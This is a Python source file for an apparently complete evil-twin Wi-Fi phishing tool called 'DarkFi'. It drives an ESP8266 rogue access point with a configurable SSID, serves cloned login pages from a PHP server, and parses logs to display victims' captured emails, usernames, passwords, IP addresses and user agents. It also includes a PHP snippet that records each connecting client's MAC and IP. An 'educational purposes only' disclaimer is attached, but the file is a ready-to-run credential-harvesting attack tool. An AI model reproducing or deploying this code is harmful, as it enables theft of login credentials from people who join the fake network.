#!/bin/python3


"""
######################### DISCLAIMER ############################
 This script or code is intended for educational purposes only.
 The author (MrP1rt3/7wp) of this program shall not hold any
 responsibility for any illegal activities that the user might
 engage in by using this program.
################################################################
"""

from multiprocessing import Process
from tabulate import tabulate
from typing import Iterator
from subprocess import run
import os, time, socket, sys
import tempfile
import fnmatch
import shutil


data = []

def print_banner():
	separator = "═"*41
	print("""
      ___           _      ___ _ 
     /   \__ _ _ __| | __ / __(_)
    / /\ / _` | '__| |/ // _\ | |
   / /_// (_| | |  |   </ /   | |
  /___,' \__,_|_|  |_|\_\/    |_| """+f"""\033[0;93mv.1.3\033[0;97m

 \033[0;97m╔{separator}╗
 \033[0;97m║ [\033[0;92m+\033[0m] Github: \033[4;92mhttps://github.com/Mrp1r4t3\033[0;97m ║
 \033[0;97m║ [\033[0;92m+\033[0m] Author: \033[4;92m7wp81x\033[0;97m                      ║
 \033[0;97m╚{separator}╝""")


def parse_data(recieve_data):
	try:
		global data
		striped_data = recieve_data.strip()
		striped_data_value = striped_data.split('=> ')[-1].strip()

		if 'email' in striped_data:
			data.append(["\033[0;92mEmail:\033[0m ", striped_data_value])

		elif 'username' in striped_data:
			data.append(["\033[0;92mUsername:\033[0m ", striped_data_value])

		elif 'pass' in striped_data:
			data.append(["\033[0;92mPassword:\033[0m ", striped_data_value])

		elif 'REMOTE_ADDR' in striped_data:
			data.append(["\033[0;92mIP:\033[0m ", striped_data_value])
			# run(["termux-notification","-t","DarkFi","-c","connected: ",striped_data_value,"--priority","high"])

		elif '[login]' in striped_data:
			data.append(["\033[0;92mLogin form\033[0m", striped_data_value])

		elif '[HTTP_USER_AGENT]' in striped_data:
			data.append(["\033[0;92mUser agent:\033[0m ", striped_data_value])

		elif 'TIMESTAMP' in striped_data:
			data.append(["\033[0;92mTimestamp: \033[0m", striped_data_value])

		elif 'COMMENT' in striped_data:
			data.append(["\033[0;92mInfo:\033[0m ", striped_data_value])
			table = tabulate(data, maxcolwidths=30, tablefmt="fancy_grid")
			print(table+'\n')
			data.clear()

	except KeyboardInterrupt:
		exit()


def follow(file, sleep_sec=5) -> Iterator[str]:
	line = ''

	while True:
		tmp = file.readline()

		if tmp is not None:
			line += tmp
			if line.endswith("\n"):
				yield line
				line = ''

		elif sleep_sec:
			time.sleep(sleep_sec)


def check_esp8266_ip():
	while True:
		time.sleep(3)

		try:
			SERVER_IP = (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]))[0]
			if SERVER_IP != "192.168.4.100":
				print(" \033[0m[\033[0;91m!\033[0m] Error: not connected to esp8266...",end='\r')

			else:
				break

		except OSError:
			print(" \033[0m[\033[0;91m!\033[0m] Error: not connect to esp8266...",end='\r')


def phpserver(directory):
	try:
		print(" \033[0;97m[\033[0;94m*\033[0;97m] \033[0;97mStarting php server...")
		os.system(f'php -S 192.168.4.100:8080 -t {directory} >/dev/null 2>&1')

	except Exception as ex:
		print(f"\033[0m[\033[0;91m!\033[0m] Error: \033[0;91m{ex}\033[0m")


def tail_mainlog():
	with open("logs/log.txt", 'r') as file:
		for line in follow(file):
			parse_data(line)


def tail_mac():
	with open("logs/client.txt", 'r') as file:
		for line in follow(file):
			print(" \033[0m[\033[0;94m*\033[0m] Connected: \033[0;92m"+line.replace(" --> ","\033[0m => \033[0;92m").strip()+"\033[0m")


def start_server():
	with open("elua.txt","w") as elua:
		elua.write("This script or code is intended for educational purposes only. The author of this program shall not hold any responsibility for any illegal activities that the user might engage in by using this program.")

	os.system("clear")
	print_banner()
	check_esp8266_ip()

	print()

	try:
		Process(target=phpserver,args=("server",)).start()
		time.sleep(1)
		print(f" \033[0;97m[\033[0;94m*\033[0;97m] \033[0;97mLog file: \033[0;92mlogs/log.txt\n \033[0;97m[\033[0;94m*\033[0;97m] \033[0;97mBlocked IPs: \033[0;92mlogs/block_ip.txt\n \033[0;97m[\033[0;94m*\033[0;97m]\033[0m Waiting for victims...\n")
		time.sleep(3)
		Process(target=tail_mainlog).start()
		Process(target=tail_mac).start()

	except KeyboardInterrupt:
		print('\033[0;91mBYE BYE !!!')
		time.sleep(2)
		sys.exit()


def custom():
	os.system('clear')
	follow_file = None
	print_banner()

	try:
		shutil.rmtree("./custom")
	except:
		pass

	directory = str(input(" \033[0m[\033[0;92m?\033[0m] Enter custom webpage directory location: "))

	if os.path.exists(directory):
		shutil.copytree(directory, './custom')
		shutil.copy("./server/client.php", "./custom/client.php")

		while True:

			redirect = str(input(" \033[0m[\033[0;92m?\033[0m] Enter file to redirect client (default: \033[0;92mindex.php\033[0m): "))
			
			if redirect != "":
				with open("./custom/client.php",'w') as client_file:
					file_data = """<?php
  header("Location: index.php");
  $mac = $_GET['id'];
  $ip = $_SERVER["REMOTE_ADDR"];
  $file = "../logs/client.txt";
  $txtfile = fopen($file, "a");
  fwrite($txtfile, $mac." --> ".$ip."\n");
  fclose($txtfile);
?>
"""
					file_data = file_data.replace("index.php",redirect)
					client_file.write(file_data)
				print(f" \033[0m[\033[0;94m*\033[0m] All client will be redirected to: \033[0;92m{redirect}\033[0m")
				break

			else:
				break

		while True:
			tailf = str(input(" \033[0m[\033[0;92m?\033[0m] Enter file to tail (default: none): "))

			if os.path.exists(tailf):
				follow_file = tailf
				break

			elif tailf in [" ","","None","none"]:
				follow_file = 0
				break

			else:
				print(" \033[0m[\033[0;91m!\033[0m] Error: file not found.")
				continue

		check_esp8266_ip()

		print()

		start = input(" \033[0m[\033[0;94m*\033[0m]\033[0m Press enter to start...")

		try:

			Process(target=phpserver, args=("custom",)).start()
			Process(target=tail_mac).start()

			if follow_file != 0:
				with open(follow_file, 'r') as file:
					for line in follow(file):
						print(line)

		except KeyboardInterrupt:
			print('\033[0;91mBYE BYE !!!')
			time.sleep(2)
			sys.exit()

	else:
		print(" \033[0m[\033[0;91m!\033[0m] Error: directory not found.")
		time.sleep(2)
		main()


def main():
	os.system('clear')

	try:
		SERVER_IP = (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]))[0]
	except OSError:
		SERVER_IP = ""

	if SERVER_IP != "192.168.4.100":
		status = "\033[0;91mDisconnected \033[0;97m║\033[0m"

	else:
		status = "\033[0;92mConnected    \033[0;97m║\033[0m"

	separator = "═"*26
	sepadd = "═"*15
	sepadd1 = "═"*14

	banner = r"""
      ___           _      ___ _ 
     /   \__ _ _ __| | __ / __(_)
    / /\ / _` | '__| |/ // _\ | |
   / /_// (_| | |  |   </ /   | |
  /___,' \__,_|_|  |_|\_\/    |_| """+f"""\033[0;93mv.1.3\033[0;97m

 \033[0;97m╔{separator}{sepadd}╗
 \033[0;97m║ [\033[0;92m+\033[0m] Github: \033[4;92mhttps://github.com/Mrp1r4t3\033[0;97m ║
 \033[0;97m║ [\033[0;92m+\033[0m] Author: \033[4;92m7wp81x\033[0;97m                      ║
 \033[0;97m╠{separator}╦{sepadd1}╝
 \033[0;97m║ [\033[0;92m+\033[0m] Status: {status}\033[0m
 \033[0;97m╠{separator}╝
 \033[0;97m║--> \033[0m\033[0;92m1\033[0m) Start Server.
 \033[0;97m║--> \033[0m\033[0;92m2\033[0m) Change SSID.
 \033[0;97m║--> \033[0m\033[0;92m3\033[0m) Show Server logs.
 \033[0;97m║--> \033[0m\033[0;92m4\033[0m) Custom.
 \033[0;97m║--> \033[0m\033[0;91m0\033[0m) Exit.
 \033[0;97m║"""

	print(banner)

	option = str(input("\033[0;97m ╚═─ \033[0m"))

	if option == "1":
		start_server()

	elif option == "2":
		try:

			if (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]))[0] != "192.168.4.100":
				print(" \033[0m[\033[0;91m!\033[0m] Please connect to ESP8266!")
				time.sleep(2)
				main()

		except OSError:
			print(" \033[0m[\033[0;91m!\033[0m] Please connect to ESP8266!")
			time.sleep(2)
			main()

		ssid = str(input(" \033[0m[\033[0;92m?\033[0m] Enter SSID: "))

		if ssid != "":
			ssid = ssid.replace(" ","+")

			request = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			request.connect(('192.168.4.1',80))
			request.send(f'GET /setting?ssid={ssid} HTTP/1.1\r\nHost: 192.168.4.1\r\n\r\n'.encode())
			request.close()

			print(" \033[0m[\033[0;94m*\033[0m] ESP8266 is restarting...")
			print(" \033[0m[\033[0;94m*\033[0m] Reconnect to ESP8266...")
			time.sleep(5)
			main()

		else:
			print(" \033[0m[\033[0;91m!\033[0m] Enter a valid SSID!")
			time.sleep(3)
			main()

	elif option == "3":
		with open("logs/log.txt", 'r') as file:
			for line in file.readlines():
				parse_data(line)
		sd=input(" \033[0m[\033[0;94m*\033[0m] Enter to back...")
		main()

	elif option == "4":
		custom()


	elif option == "0":
		exit()

	else:
		print(" \033[0m[\033[0;91m!\033[0m] Enter a valid option!")
		time.sleep(2)
		main()

if __name__ == '__main__':
	print("\033[0;92mThis script or code is intended for educational purposes only.\n \
 The author of this program shall not hold any responsibility for any illegal activities\
\n that the user might engage in by using this program.\n")
	agree = input("\033[0m[\033[0;94m*\033[0m] Press enter to agree...")
	file_list = os.listdir(tempfile.gettempdir())
	for filename in file_list:
		if fnmatch.fnmatch(filename, f"*sess_*"):
			file_path = os.path.join(tempfile.gettempdir(), filename)
			os.remove(file_path)

	if not os.path.exists("logs/log.txt"): open("logs/log.txt","w").write('')
	if os.path.exists("logs/client.txt"): open("logs/client.txt","w").write('')
	if os.path.exists("logs/block_ip.txt"): open("logs/block_ip.txt","w").write('')
	main()